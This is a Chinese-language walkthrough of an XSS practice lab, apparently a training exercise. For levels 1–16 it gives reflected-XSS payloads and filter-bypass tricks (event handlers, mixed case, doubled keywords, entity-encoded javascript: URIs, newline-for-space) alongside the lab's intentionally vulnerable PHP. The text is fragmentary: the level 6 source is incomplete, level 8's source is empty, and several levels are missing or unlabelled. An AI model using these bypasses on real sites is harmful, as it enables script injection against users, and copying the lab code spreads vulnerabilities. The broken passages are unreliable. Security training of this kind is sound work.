level 1

为get型注入，在url中name字段输入的内容会在页面显示，所以采用标签注入：

name=<script>alert('xss')</script>

除了<script>标签，<img>、<p>、<input>等标签都可以
查看源码：

<?php
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>

通过get获取name参数，然后注入js代码。level1的问题出现在$str = $_GET["name"];，没有对输入的name参数内容做过滤和限制
修复建议：

$str = htmlspecialchars($_GET["name"] , ENT_QUOTES);

htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体，ENT_QUOTES一定要带上。

level 2

我们输入的keyword参数在<input>标签的value属性中，这时可以通过闭合标签，注入代码：

keyword="><script>alert(/xss/)</script>

也可以通过添加事件注入代码

keyword=" onclick="alert(/xss/)"

查看源码：

<?php
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level2.php method=GET>
<input name=keyword value="'.$str.'">
<input type=submit name=submit value="搜索"/>
</form>
</center>';
?>

<h2>标签中存在.htmlspecialchars($str)，不存在xss注入，但是<input>标签的value属性没有做任何的过滤，所以可以注入js代码。

level 3

经过测试发现后端利用htmlspecialchars函数转为HTML实体编码后输出的，但是没有设置第二参数，就导致只对"<"、">"和双引号进行实体编码，但是可以通过单引号引入事件进行注入代码

keyword=' onclick='alert(/xss/)

查看源码：

<?php
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level3.php method=GET>
<input name=keyword value='".htmlspecialchars($str)."'>
<input type=submit name=submit value=搜索 />
</form>
</center>";
?>

这次<input>标签虽然经过htmlspecialchars函数实体编码，但是没有加上第二参数，就导致可以使用单引号进行注入

level 4


经过测试发现过滤"<"和">"，但是单引号和双引号可以使用，依旧可以通过构造事件注入

keyword=" onclick="alert(/xss/)

查看源码：

<?php
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level4.php method=GET>
<input name=keyword value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>

使用str_replace函数将参数中的"<"和">"置换为空，但是忽略了引号。

level 5


经过测试发现，<script被转换成<scr_ipt，on被转换成o_n，这时候<script>标签和含有on的事件都不能用了，这时候可以使用其他不含有on的事件和标签

keyword="> <a href="javascript:alert(/xss/)">xss</a> <"

将前面的标签先闭合，在引入一个<a>标签，最后再闭合后面的标签
查看源码：

<?php
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>

首先使用strtolower函数输入的参数全部转化成小写，之后再使用str_replace函数将参数中的<script转换成<scr_ipt，on转换成o_n，这种方法可以杜绝大小写绕过，但是没有考虑完善。

level 6


经过测试发现level 6对比上一关，对href也进行了隔开，但是可以使用大小写绕过

keyword="> <a HrEf="javascript:alert(/xss/)">xss</a> <"

查看源码：

<?php
ini_set("display_errors", 0);
$str = $_GET["keyword"];

$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);

<form action=level6.php method=GET>
<input name=keyword value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';

level 6的源码相较于上一关虽然增加了对"src"、"data"和"href"的检测过滤，但是缺少了strtolower函数将参数字母统一，就导致了可以通过大小写绕过进行注入。

经过测试发现on被置换为空，所以可以通过双写on进行绕过

keyword=" oonnclick="alert(/xss/)

level 8


经过测试发现<input>标签的value属性采用了html实体编码，无法进行注入，但是<a>标签的href属性没有采取措施，所以可以通过html实体编码进行注入

javascript:alert(/xss/)


&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x2F;&#x78;&#x73;&#x73;&#x2F;&#x29;

查看源码：

<?php

发现<input>标签虽然进行了html实体编码，但是<a>标签href属性的值为过滤后的参数直接插入，所以导致了注入。

经过测试，level 10会过滤">"和"<"，所以可以通过构造事件注入

keyword=test&t_link=test&t_history=test&t_sort=" onclick="alert(/xss/)" type="text"

level 16

经过测试，发现空格、"/"和"script"都被替换成&nbsp;了，大小写和双写无法绕过，可用使用其他标签进行注入，空格可以使用%0a和%0d替换

keyword=<img%0asrc=1%0donerror=alert('xss')>

查看源码：

<?php

$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","&nbsp;",$str);
$str3=str_replace(" ","&nbsp;",$str2);
$str4=str_replace("/","&nbsp;",$str3);
$str5=str_replace(" ","&nbsp;",$str4);
echo "<center>".$str5."</center>";
?>
<center><img src=level16.png></center>
<?php
echo "<h3 align=center>payload的长度:".strlen($str5)."</h3>";
?>

首先将输入的keyword字符全部转成小写，然后将数据中的"script"、"/"、空格和制表符全部替换为"&nbsp;"，最后再输出到<center>标签中。
